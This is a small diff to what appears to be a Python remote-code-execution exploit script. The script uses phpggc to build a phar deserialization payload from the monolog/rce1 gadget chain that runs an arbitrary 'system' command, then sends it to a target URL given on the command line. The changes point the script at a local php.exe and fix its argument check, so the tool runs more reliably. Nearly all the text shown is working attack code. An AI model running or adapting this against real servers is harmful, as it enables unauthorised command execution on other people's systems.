@@ -128,13 +128,13 @@ class Exploit:
 
 
 def main(url, command):
-    os.system(f"php -d'phar.readonly=0' ./phpggc/phpggc --phar phar -o ./exploit.phar --fast-destruct monolog/rce1 system {command}")    
+    os.system(f"./php/php.exe -d phar.readonly=0 ./phpggc/phpggc --phar phar -o ./exploit.phar --fast-destruct monolog/rce1 system {command}")    
     payload = open('./exploit.phar', 'rb').read()
     exploit = Exploit(url.rstrip('/'), payload, None)
     exploit.main()
 
 
-if len(sys.argv) <= 1:
+if len(sys.argv) <= 2:
     print(
         f'Usage: {sys.argv[0]} <url> <command_to_execute>\n'
         'Example:\n'
